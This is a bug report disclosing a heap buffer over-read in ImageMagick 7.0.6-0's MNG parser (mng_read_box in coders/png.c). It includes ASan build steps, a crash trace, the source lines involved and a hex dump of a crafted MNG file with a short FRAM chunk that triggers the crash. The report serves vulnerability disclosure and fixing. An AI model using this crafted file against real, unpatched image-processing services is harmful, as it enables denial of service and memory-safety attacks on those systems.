ImageMagick-7.0.6-0
<br>
```
  ~$identify $FILE or convert $FILE
```
<br>build instructions:
```
  ~$ sudo apt-get install imagemagick libmagick++-dev
  ~$ CC="gcc" CFLAGS="-fsanitize=address" ./configure 
  ~$ make;make install
```
when identify or convert MNG file, imagemagick will cause a heap buffer overflow
> =================================================================
==10476==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000008b7b at pc 0x7ffff6844757 bp 0x7fffffff1250 sp 0x7fffffff1240READ of size 1 at 0x602000008b7b thread T0    #0 0x7ffff6844756 in mng_read_box coders/png.c:1599    #1 0x7ffff68559eb in ReadOneMNGImage coders/png.c:5761    #2 0x7ffff685fe29 in ReadMNGImage coders/png.c:7497    #3 0x7ffff63d7c4f in ReadImage MagickCore/constitute.c:497    #4 0x7ffff6623e06 in ReadStream MagickCore/stream.c:1045    #5 0x7ffff63d717c in PingImage MagickCore/constitute.c:226    #6 0x7ffff63d75a9 in PingImages MagickCore/constitute.c:327    #7 0x7ffff5d97a2a in IdentifyImageCommand MagickWand/identify.c:319    #8 0x7ffff5deec7a in MagickCommandGenesis MagickWand/mogrify.c:183    #9 0x40169a in MagickMain utilities/magick.c:149    #10 0x4017be in main utilities/magick.c:180    #11 0x7ffff566782f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x4012c8 in _start (/home/sf/ImageMagick-7.0.6-0/build-gcc/bin/magick+0x4012c8)>0x602000008b7b is located 0 bytes to the right of 11-byte region [0x602000008b70,0x602000008b7b)allocated by thread T0 here:    #0 0x7ffff6f02602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)    #1 0x7ffff64f6a00 in AcquireMagickMemory MagickCore/memory.c:463

The vulnerability is caused when identify MNG image, which happens  in function coders/png.c: mng_read_box(..).  The crash happens at line 1599 of coders/png.c, function mng_read_box is called by line 5761:
Here is the critical code of mng_get_long and its call code:
```
1590	static MngBox mng_read_box(MngBox previous_box,char delta_type,1591	  unsigned char *p)1592	{1593	   MngBox1594	      box;1595	1596	  /*(gdb) l1597	    Read clipping boundaries from DEFI, CLIP, FRAM, or PAST chunk.1598	  */1599	  box.left=(ssize_t) ((p[0]  << 24) | (p[1]  << 16) | (p[2]  << 8) | p[3]);1600	  box.right=(ssize_t) ((p[4]  << 24) | (p[5]  << 16) | (p[6]  << 8) | p[7]);1601	  box.top=(ssize_t) ((p[8]  << 24) | (p[9]  << 16) | (p[10] << 8) | p[11]);1602	  box.bottom=(ssize_t) ((p[12] << 24) | (p[13] << 16) | (p[14] << 8) | p[15]);1603	  if (delta_type != 0)1604	    {1605	      box.left+=previous_box.left;1606	      box.right+=previous_box.right;
```

```
5758	5759	                if (change_clipping)5760	                  {5761	                    fb=mng_read_box(previous_fb,(char) p[0],&p[1]);5762	                    p+=17;5763	                    previous_fb=fb;5764	5765	                    if (logging != MagickFalse)```
It is caused by heap buffer overflow, which is caused by a read operation without overflow check. Buffer p pointer to chunk, when read the FRAM chunk the length is 11 (read from input file)

```
~$xxd $FILE
00000000: 8a4d 4e47 0d0a 1a0a 0000 001c 4d48 4452  .MNG........MHDR
00000010: 0000 0010 0000 0010 0000 0064 0000 0000  ...........d....
00000020: 0000 0000 0000 0000 0000 000b 2cf4 5caf  ............,.\.
00000030: 0000 000a 5445 524d 0300 0000 000a 7fff  ....TERM........
00000040: ffff 1047 baf8 0000 0009 7048 5973 0000  ...G......pHYs..
00000050: 0048 0000 0048 0046 c96b 3e00 0000 0642  .H...H.F.k>....B
00000060: 4143 4bff ffff ffff ffa1 2900 8100 0000  ACK.......).....
00000070: 0662 4b47 44ff ffff ffff ff09 58f7 dc00  .bKGD.......X...
00000080: 0000 0b46 5241 4d01 0002 0080            ...FRAM.....
```

####Testcase: 
